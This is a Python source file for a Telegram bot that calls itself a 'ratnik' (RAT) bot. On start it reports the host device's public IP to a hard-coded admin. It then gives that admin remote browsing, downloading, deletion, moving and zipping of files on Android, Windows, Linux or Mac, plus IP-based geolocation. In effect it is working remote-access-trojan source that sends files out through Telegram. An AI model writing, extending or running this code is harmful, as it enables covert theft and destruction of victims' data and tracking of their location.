import os
import shutil
import sys
import requests
import psutil
import socket
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
os.system("pip install aiogram==2.25.1")
storage = MemoryStorage()
bot = Bot(token)
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())

ALLOWED_USERS = [ADMIN_ID]

ROOT_DIRECTORIES = {
    'android': '/storage/emulated/0/',
    'windows': 'C:/',
    'linux': '/home/',
    'mac': '/Users/'
}

class SettingsStates(StatesGroup):
    LANGUAGE = State()
    CREATE_BOT = State()
    DELETE = State()
    RENAME = State()
    RENAME_NEW_NAME = State()
    CREATE_FOLDER = State()
    MOVE_FOLDER = State()
    MOVE_FOLDER_DEST = State()
    COPY_DATA = State()
    COPY_DATA_DEST = State()
    COMPRESS_TO_ZIP = State()

LANGUAGES = {
    'ru': {
        'welcome': "🎉 Привет! Я ваш универсальный бот ратник. 🤖\nЧем могу помочь? Выберите действие ниже:",
        'view_files': "📂 Просмотр данных",
        'delete': "🗑️ Удалить",
        'rename': "✏️ Переименовать",
        'create_folder': "📁 Создать папку",
        'move_folder': "🚚 Переместить",
        'copy_data': "📂 Копировать",
        'clear_data': "🗑️ Очистка данных",
        'location': "🌍 Местоположение",
        'compress_to_zip': "📦 Сжать в ZIP",
        'compress_to_zip_success': "✅ Папка успешно сжата в архив.",
        'compress_to_zip_deleted': "🗑️ Архив удален с устройства.",
        'compress_to_zip_error': "❌ Ошибка при сжатии папки: {error}",
        'settings': "⚙️ Настройки",
        'language': "🌐 Язык",
        'invalid_path': "❌ Указанный путь не существует. Пожалуйста, попробуйте снова.",
        'enter_path': "Введите путь:\n\nПримеры путей для вашего устройства:\n{examples}",
        'cancel': "❌ Действие отменено.",
        'no_access': "🚫 У вас нет прав на использование этого бота.",
        'file_not_found': "❌ Файл или папка не найдены.",
        'success_delete': "✅ Успешно удалено: {path}",
        'error_delete': "❌ Ошибка при удалении: {error}",
        'success_rename': "✅ Успешно переименовано в: {new_path}",
        'error_rename': "❌ Ошибка при переименовании: {error}",
        'success_create_folder': "✅ Папка создана: {path}",
        'error_create_folder': "❌ Ошибка при создании папки: {error}",
        'success_move': "✅ Успешно перемещено в: {destination_path}",
        'error_move': "❌ Ошибка при перемещении: {error}",
        'success_copy': "✅ Успешно скопировано в: {destination_path}",
        'error_copy': "❌ Ошибка при копировании: {error}",
        'select_language': "🌐 Выберите язык:",
        'language_changed': "🌐 Язык изменен на {language}.",
        'page': "📄 Страница {current}/{total}",
        'previous': "⬅️ Предыдущая",
        'next': "➡️ Следующая",
        'back': "⬅️ Назад",
        'return_to_menu': "🔙 В меню",
        'folder_contents': "📂 Содержимое папки: {directory}",
        'folders': "📁 Папки",
        'folders_menu': "📁 Выберите действие с папками:",
    },
    'en': {
        'welcome': "🎉 Hello! I'm your universal warrior bot. 🤖\nHow can I help? Select an action below",
        'view_files': "📂 View files",
        'delete': "🗑️ Delete",
        'rename': "✏️ Rename",
        'create_folder': "📁 Create folder",
        'move_folder': "🚚 Move",
        'copy_data': "📂 Copy data",
        'clear_data': "🗑️ Clear data",
        'location': "🌍 Location",
        'compress_to_zip': "📦 Compress to ZIP",
        'compress_to_zip_success': "✅ Folder successfully compressed into an archive.",
        'compress_to_zip_deleted': "🗑️ Archive deleted from the device.",
        'compress_to_zip_error': "❌ Error while compressing folder: {error}",
        'settings': "⚙️ Settings",
        'language': "🌐 Language",
        'invalid_path': "❌ The specified path does not exist. Please try again.",
        'enter_path': "Enter path:\n\nExample paths for your device:\n{examples}",
        'cancel': "❌ Action canceled.",
        'no_access': "🚫 You do not have permission to use this bot.",
        'file_not_found': "❌ File or folder not found.",
        'success_delete': "✅ Successfully deleted: {path}",
        'error_delete': "❌ Error while deleting: {error}",
        'success_rename': "✅ Successfully renamed to: {new_path}",
        'error_rename': "❌ Error while renaming: {error}",
        'success_create_folder': "✅ Folder created: {path}",
        'error_create_folder': "❌ Error while creating folder: {error}",
        'success_move': "✅ Successfully moved to: {destination_path}",
        'error_move': "❌ Error while moving: {error}",
        'success_copy': "✅ Successfully copied to: {destination_path}",
        'error_copy': "❌ Error while copying: {error}",
        'select_language': "🌐 Select language:",
        'language_changed': "🌐 Language changed to {language}.",
        'page': "📄 Page {current}/{total}",
        'previous': "⬅️ Previous",
        'next': "➡️ Next",
        'back': "⬅️ Back",
        'return_to_menu': "🔙 Return to menu",
        'folder_contents': "📂 Folder contents: {directory}",
        'folders': "📁 Folders",
        'folders_menu': "📁 Choose folder action:",
    }
}

USER_LANGUAGE = {}

def get_language(chat_id):
    return USER_LANGUAGE.get(chat_id, 'ru')

def set_language(chat_id, language):
    USER_LANGUAGE[chat_id] = language

navigation_history = {}
last_message_id = {}
current_action = {}
file_paths = {}

def get_device_type():
    if len(sys.argv) > 1:
        device_type = sys.argv[1].lower()
        if device_type in ROOT_DIRECTORIES:
            return device_type
        else:
            log(f"Неизвестный тип устройства: {device_type}. Использую автоматическое определение.")

    if os.name == 'posix':
        if 'ANDROID_ROOT' in os.environ:
            return 'android'
        elif os.uname().sysname == 'Linux':
            return 'linux'
        else:
            return 'mac'
    elif os.name == 'nt':
        return 'windows'
    return 'linux'

DEVICE_TYPE = get_device_type()
ROOT_DIRECTORY = ROOT_DIRECTORIES.get(DEVICE_TYPE, '/')

def get_device_examples():
    if DEVICE_TYPE == 'android':
        return (
            "- `/storage/emulated/0/Download`\n"
            "- `/storage/emulated/0/DCIM`\n"
            "- `/storage/emulated/0/Music`"
        )
    elif DEVICE_TYPE == 'windows':
        return (
            "- `C:/Users/YourUsername/Documents`\n"
            "- `C:/Users/YourUsername/Downloads`\n"
            "- `C:/Program Files`"
        )
    elif DEVICE_TYPE == 'linux':
        return (
            "- `/home/YourUsername/Documents`\n"
            "- `/home/YourUsername/Downloads`\n"
            "- `/var/log`"
        )
    elif DEVICE_TYPE == 'mac':
        return (
            "- `/Users/YourUsername/Documents`\n"
            "- `/Users/YourUsername/Downloads`\n"
            "- `/Applications`"
        )
    return "Примеры путей недоступны для вашего устройства."

async def send_device_info(chat_id):
    ip_address = get_public_ip()
    device_info = (
        f"📋 *Информация об устройстве:*\n"
        f"📱 Тип устройства: `{DEVICE_TYPE}`\n"
        f"🌐 IP-адрес: `{ip_address}`"
    )
    await bot.send_message(chat_id, device_info, parse_mode="Markdown")

def get_file_emoji(file_name):
    if file_name.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp')):
        return '🖼️'
    elif file_name.lower().endswith(('.mp3', '.wav', '.ogg', '.flac')):
        return '🎵'
    elif file_name.lower().endswith(('.mp4', '.mov', '.avi', '.mkv', '.flv')):
        return '🎥'
    elif file_name.lower().endswith(('.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx')):
        return '📄'
    elif file_name.lower().endswith(('.zip', '.rar', '.tar', '.gz', '.7z')):
        return '📦'
    elif file_name.lower().endswith(('.exe', '.msi', '.bat', '.sh')):
        return '⚙️'
    elif file_name.lower().endswith(('.lnk', '.desktop', '.url')):
        return '🔗'
    else:
        return '📄'

async def show_directory_contents(chat_id, directory, page=0):
    if chat_id not in navigation_history:
        navigation_history[chat_id] = []

    navigation_history[chat_id].append(directory)

    keyboard = InlineKeyboardMarkup()
    items = os.listdir(directory)
    items = sorted(items, key=lambda x: os.path.isdir(os.path.join(directory, x)), reverse=True)

    ITEMS_PER_PAGE = 10
    total_pages = (len(items) + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE

    if page < 0:
        page = total_pages - 1
    elif page >= total_pages:
        page = 0

    start = page * ITEMS_PER_PAGE
    end = start + ITEMS_PER_PAGE
    current_items = items[start:end]

    file_paths[chat_id] = {}

    for index, item in enumerate(current_items):
        item_path = os.path.join(directory, item)
        file_paths[chat_id][str(index)] = item_path

        if os.path.isdir(item_path):
            button = InlineKeyboardButton(f'📁 {item}', callback_data=f'select_{index}')
        else:
            emoji = get_file_emoji(item)
            button = InlineKeyboardButton(f'{emoji} {item}', callback_data=f'select_{index}')
        keyboard.add(button)
    if directory != ROOT_DIRECTORY:
        keyboard.add(InlineKeyboardButton(LANGUAGES[get_language(chat_id)]['back'], callback_data='back'))

    keyboard.add(
        InlineKeyboardButton(LANGUAGES[get_language(chat_id)]['previous'], callback_data=f'page_{page - 1}'),
        InlineKeyboardButton(LANGUAGES[get_language(chat_id)]['page'].format(current=page + 1, total=total_pages), callback_data='ignore'),
        InlineKeyboardButton(LANGUAGES[get_language(chat_id)]['next'], callback_data=f'page_{page + 1}')
    )

    keyboard.add(InlineKeyboardButton(LANGUAGES[get_language(chat_id)]['return_to_menu'], callback_data='return_to_menu'))

    if chat_id in last_message_id:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=last_message_id[chat_id],
                text=LANGUAGES[get_language(chat_id)]['folder_contents'].format(directory=directory),
                reply_markup=keyboard
            )
        except Exception as e:
            print(f"Ошибка при редактировании сообщения: {e}")
            last_message_id[chat_id] = (await bot.send_message(chat_id, LANGUAGES[get_language(chat_id)]['folder_contents'].format(directory=directory), reply_markup=keyboard)).message_id
    else:
        last_message_id[chat_id] = (await bot.send_message(chat_id, LANGUAGES[get_language(chat_id)]['folder_contents'].format(directory=directory), reply_markup=keyboard)).message_id

@dp.callback_query_handler(lambda call: call.data == 'return_to_menu')
async def handle_return_to_menu(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    try:
        await bot.delete_message(chat_id, call.message.message_id)
    except Exception as e:
        print(f"Ошибка при удалении сообщения: {e}")

@dp.callback_query_handler(lambda call: call.data.startswith('select_'))
async def handle_select(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    index = call.data.split('_', 1)[1]
    if chat_id in file_paths and index in file_paths[chat_id]:
        selected_path = file_paths[chat_id][index]
        if os.path.isdir(selected_path):
            await show_directory_contents(chat_id, selected_path)
        else:
            await handle_file_click(call, selected_path)
    else:
        await bot.send_message(chat_id, LANGUAGES[get_language(chat_id)]['file_not_found'])

async def handle_file_click(call: types.CallbackQuery, file_path):
    chat_id = call.message.chat.id
    try:
        with open(file_path, 'rb') as file:
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp')):
                await bot.send_photo(chat_id, file)
            elif file_path.lower().endswith(('.mp3', '.wav', '.ogg', '.flac')):
                await bot.send_audio(chat_id, file)
            elif file_path.lower().endswith(('.mp4', '.mov', '.avi', '.mkv', '.flv')):
                await bot.send_video(chat_id, file)
            elif file_path.lower().endswith(('.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx')):
                await bot.send_document(chat_id, file)
            elif file_path.lower().endswith(('.zip', '.rar', '.tar', '.gz', '.7z')):
                await bot.send_document(chat_id, file)
            elif file_path.lower().endswith(('.exe', '.msi', '.bat', '.sh')):
                await bot.send_document(chat_id, file)
            elif file_path.lower().endswith(('.lnk', '.desktop', '.url')):
                await bot.send_document(chat_id, file)
            else:
                await bot.send_document(chat_id, file)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка при отправке файла: {e}")

@dp.callback_query_handler(lambda call: call.data == 'back')
async def handle_back_click(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    if chat_id in navigation_history and len(navigation_history[chat_id]) > 1:
        navigation_history[chat_id].pop()
        previous_directory = navigation_history[chat_id][-1]
        await show_directory_contents(chat_id, previous_directory)

@dp.callback_query_handler(lambda call: call.data.startswith('page_'))
async def handle_page_click(call: types.CallbackQuery):
    page = int(call.data.split('_', 1)[1])
    chat_id = call.message.chat.id
    if chat_id in navigation_history:
        current_directory = navigation_history[chat_id][-1]
        await show_directory_contents(chat_id, current_directory, page)

@dp.callback_query_handler(lambda call: call.data == 'ignore')
async def handle_ignore(call: types.CallbackQuery):
    pass

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    chat_id = message.chat.id
    lang = get_language(chat_id)
    welcome_text = LANGUAGES[lang]['welcome']
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        InlineKeyboardButton(LANGUAGES[lang]['view_files'], callback_data='view_files'),
        InlineKeyboardButton(LANGUAGES[lang]['folders'], callback_data='folders'),
        InlineKeyboardButton(LANGUAGES[lang]['settings'], callback_data='settings'),
        InlineKeyboardButton(LANGUAGES[lang]['location'], callback_data='location'),
    ]
    
    keyboard.add(*buttons)
    await bot.send_message(chat_id, text=welcome_text, reply_markup=keyboard, parse_mode="Markdown")

@dp.callback_query_handler(lambda call: call.data == 'folders')
async def handle_folders(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    lang = get_language(chat_id)
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        InlineKeyboardButton(LANGUAGES[lang]['create_folder'], callback_data='create_folder'),
        InlineKeyboardButton(LANGUAGES[lang]['move_folder'], callback_data='move_folder'),
        InlineKeyboardButton(LANGUAGES[lang]['copy_data'], callback_data='copy_data'),
        InlineKeyboardButton(LANGUAGES[lang]['delete'], callback_data='delete'),
        InlineKeyboardButton(LANGUAGES[lang]['rename'], callback_data='rename'),
        InlineKeyboardButton(LANGUAGES[lang]['compress_to_zip'], callback_data='compress_to_zip'),
        InlineKeyboardButton(LANGUAGES[lang]['back'], callback_data='back_to_menu'),
    ]
    
    keyboard.add(*buttons)
    await call.message.edit_text(LANGUAGES[lang]['folders_menu'], reply_markup=keyboard)

@dp.callback_query_handler(lambda call: call.data == 'view_files')
async def handle_view_files(call: types.CallbackQuery):
    await show_directory_contents(call.message.chat.id, ROOT_DIRECTORY)

@dp.callback_query_handler(lambda call: call.data == 'delete')
async def handle_delete(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    current_action[chat_id] = 'delete'
    lang = get_language(chat_id)
    examples = get_device_examples()
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_path'].format(examples=examples))
    await SettingsStates.DELETE.set()

@dp.message_handler(state=SettingsStates.DELETE)
async def process_delete(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    path = message.text
    lang = get_language(chat_id)
    if not os.path.exists(path):
        await bot.send_message(chat_id, LANGUAGES[lang]['invalid_path'])
        await state.finish()
        return
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        await bot.send_message(chat_id, LANGUAGES[lang]['success_delete'].format(path=path))
    except Exception as e:
        await bot.send_message(chat_id, LANGUAGES[lang]['error_delete'].format(error=e))
    await state.finish()

@dp.callback_query_handler(lambda call: call.data == 'rename')
async def handle_rename(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    current_action[chat_id] = 'rename'
    lang = get_language(chat_id)
    examples = get_device_examples()
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_path'].format(examples=examples))
    await SettingsStates.RENAME.set()

@dp.message_handler(state=SettingsStates.RENAME)
async def process_rename_step1(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    path = message.text
    lang = get_language(chat_id)
    if not os.path.exists(path):
        await bot.send_message(chat_id, LANGUAGES[lang]['invalid_path'])
        await state.finish()
        return
    current_action[chat_id] = {'action': 'rename', 'path': path}
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_new_name'])
    await SettingsStates.RENAME_NEW_NAME.set()

@dp.message_handler(state=SettingsStates.RENAME_NEW_NAME)
async def process_rename_step2(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    new_name = message.text
    path = current_action[chat_id]['path']
    new_path = os.path.join(os.path.dirname(path), new_name)
    lang = get_language(chat_id)
    try:
        os.rename(path, new_path)
        await bot.send_message(chat_id, LANGUAGES[lang]['success_rename'].format(new_path=new_path))
    except Exception as e:
        await bot.send_message(chat_id, LANGUAGES[lang]['error_rename'].format(error=e))
    await state.finish()

@dp.callback_query_handler(lambda call: call.data == 'create_folder')
async def handle_create_folder(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    current_action[chat_id] = 'create_folder'
    lang = get_language(chat_id)
    examples = get_device_examples()
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_path'].format(examples=examples))
    await SettingsStates.CREATE_FOLDER.set()

@dp.message_handler(state=SettingsStates.CREATE_FOLDER)
async def process_create_folder(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    path = message.text
    lang = get_language(chat_id)
    try:
        os.makedirs(path)
        await bot.send_message(chat_id, LANGUAGES[lang]['success_create_folder'].format(path=path))
    except Exception as e:
        await bot.send_message(chat_id, LANGUAGES[lang]['error_create_folder'].format(error=e))
    await state.finish()

@dp.callback_query_handler(lambda call: call.data == 'move_folder')
async def handle_move_folder(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    current_action[chat_id] = 'move_folder'
    lang = get_language(chat_id)
    examples = get_device_examples()
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_path'].format(examples=examples))
    await SettingsStates.MOVE_FOLDER.set()

@dp.message_handler(state=SettingsStates.MOVE_FOLDER)
async def process_move_step1(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    path = message.text
    lang = get_language(chat_id)
    if not os.path.exists(path):
        await bot.send_message(chat_id, LANGUAGES[lang]['invalid_path'])
        await state.finish()
        return
    current_action[chat_id] = {'action': 'move', 'source_path': path}
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_destination_path'])
    await SettingsStates.MOVE_FOLDER_DEST.set()

@dp.message_handler(state=SettingsStates.MOVE_FOLDER_DEST)
async def process_move_step2(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    destination_path = message.text
    source_path = current_action[chat_id]['source_path']
    lang = get_language(chat_id)
    try:
        shutil.move(source_path, destination_path)
        await bot.send_message(chat_id, LANGUAGES[lang]['success_move'].format(destination_path=destination_path))
    except Exception as e:
        await bot.send_message(chat_id, LANGUAGES[lang]['error_move'].format(error=e))
    await state.finish()

@dp.callback_query_handler(lambda call: call.data == 'copy_data')
async def handle_copy_data(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    current_action[chat_id] = 'copy_data'
    lang = get_language(chat_id)
    examples = get_device_examples()
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_path'].format(examples=examples))
    await SettingsStates.COPY_DATA.set()

@dp.message_handler(state=SettingsStates.COPY_DATA)
async def process_copy_step1(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    path = message.text
    lang = get_language(chat_id)
    if not os.path.exists(path):
        await bot.send_message(chat_id, LANGUAGES[lang]['invalid_path'])
        await state.finish()
        return
    current_action[chat_id] = {'action': 'copy', 'source_path': path}
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_destination_path'])
    await SettingsStates.COPY_DATA_DEST.set()

@dp.message_handler(state=SettingsStates.COPY_DATA_DEST)
async def process_copy_step2(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    destination_path = message.text
    source_path = current_action[chat_id]['source_path']
    lang = get_language(chat_id)
    try:
        if os.path.isdir(source_path):
            shutil.copytree(source_path, os.path.join(destination_path, os.path.basename(source_path)))
        else:
            shutil.copy(source_path, destination_path)
        await bot.send_message(chat_id, LANGUAGES[lang]['success_copy'].format(destination_path=destination_path))
    except Exception as e:
        await bot.send_message(chat_id, LANGUAGES[lang]['error_copy'].format(error=e))
    await state.finish()

@dp.callback_query_handler(lambda call: call.data == 'compress_to_zip')
async def handle_compress_to_zip(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    lang = get_language(chat_id)
    examples = get_device_examples()
    await bot.send_message(chat_id, LANGUAGES[lang]['enter_path'].format(examples=examples))
    await SettingsStates.COMPRESS_TO_ZIP.set()

@dp.message_handler(state=SettingsStates.COMPRESS_TO_ZIP)
async def process_compress_to_zip(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    path = message.text
    lang = get_language(chat_id)

    if not os.path.exists(path):
        await bot.send_message(chat_id, LANGUAGES[lang]['invalid_path'])
        await state.finish()
        return

    try:
        zip_filename = f"{os.path.basename(path)}.zip"
        shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', path)
        with open(zip_filename, 'rb') as zip_file:
            await bot.send_document(chat_id, zip_file, caption=LANGUAGES[lang]['compress_to_zip_success'])
        os.remove(zip_filename)
        await bot.send_message(chat_id, LANGUAGES[lang]['compress_to_zip_deleted'])
    except Exception as e:
        await bot.send_message(chat_id, LANGUAGES[lang]['compress_to_zip_error'].format(error=e))
    await state.finish()

@dp.callback_query_handler(lambda call: call.data == 'location')
async def handle_location(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    lang = get_language(chat_id)
    ip_address = get_public_ip()
    
    if "Ошибка" in ip_address:
        await call.message.answer(f"❌ {ip_address}")
        return
    location_info = await get_location_info(ip_address)
    
    if not location_info:
        await call.message.answer(LANGUAGES[lang]['location_error'])
        return
    latitude = location_info['lat']
    longitude = location_info['lon']
    await bot.send_location(chat_id, latitude, longitude)
    
    info = (
        f"🌍 *Местоположение:*\n"
        f"📍 IP-адрес: `{ip_address}`\n"
        f"📍 Страна: {location_info['country']}\n"
        f"📍 Регион: {location_info['regionName']}\n"
        f"📍 Город: {location_info['city']}\n"
        f"📍 Почтовый индекс: {location_info['zip']}\n"
        f"📍 Широта: {latitude}\n"
        f"📍 Долгота: {longitude}\n"
        f"📍 Провайдер: {location_info['isp']}\n"
        f"📍 Организация: {location_info['org']}\n"
        f"📍 AS: {location_info['as']}"
    )
    await call.message.answer(info, parse_mode="Markdown")

@dp.callback_query_handler(lambda call: call.data == 'settings')
async def settings(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    lang = get_language(chat_id)
    keyboard = InlineKeyboardMarkup()
    buttons = [
        InlineKeyboardButton(LANGUAGES[lang]['language'], callback_data='change_language'),
        InlineKeyboardButton(LANGUAGES[lang]['back'], callback_data='back_to_menu'),  
    ]
    keyboard.add(*buttons)
    await call.message.edit_text(LANGUAGES[lang]['settings'], reply_markup=keyboard)

@dp.callback_query_handler(lambda call: call.data == 'change_language')
async def change_language(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    lang = get_language(chat_id)
    keyboard = InlineKeyboardMarkup()
    buttons = [
        InlineKeyboardButton("🇷🇺 Русский", callback_data='set_language_ru'),
        InlineKeyboardButton("🇺🇸 English", callback_data='set_language_en'),
        InlineKeyboardButton(LANGUAGES[lang]['back'], callback_data='settings'),  
    ]
    keyboard.add(*buttons)
    await call.message.edit_text(LANGUAGES[lang]['select_language'], reply_markup=keyboard)

@dp.callback_query_handler(lambda call: call.data.startswith('set_language_'))
async def set_language_handler(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    language = call.data.split('_')[-1]
    set_language(chat_id, language)
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(LANGUAGES[language]['back'], callback_data='change_language'))  
    await call.message.edit_text(LANGUAGES[language]['language_changed'].format(language=language), reply_markup=keyboard)

@dp.callback_query_handler(lambda call: call.data == 'back_to_menu')
async def back_to_menu(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    lang = get_language(chat_id)
    welcome_text = LANGUAGES[lang]['welcome']
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        InlineKeyboardButton(LANGUAGES[lang]['view_files'], callback_data='view_files'),
        InlineKeyboardButton(LANGUAGES[lang]['folders'], callback_data='folders'),
        InlineKeyboardButton(LANGUAGES[lang]['settings'], callback_data='settings'),
        InlineKeyboardButton(LANGUAGES[lang]['location'], callback_data='location'),
    ]
    
    keyboard.add(*buttons)
    await call.message.edit_text(welcome_text, reply_markup=keyboard, parse_mode="Markdown")

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json()['ip']
        else:
            return "Не удалось получить IP-адрес"
    except Exception as e:
        return f"Ошибка при получении IP-адреса: {e}"

async def send_device_info(chat_id):
    ip_address = get_public_ip()
    device_info = (
        f"📋 *Информация об устройстве:*\n"
        f"📱 Тип устройства: `{DEVICE_TYPE}`\n"
        f"🌐 IP-адрес: `{ip_address}`"
    )
    await bot.send_message(chat_id, device_info, parse_mode="Markdown")

if __name__ == '__main__':
    import asyncio
    loop = asyncio.get_event_loop()
    loop.run_until_complete(send_device_info(ADMIN_ID))
    executor.start_polling(dp, skip_updates=True)
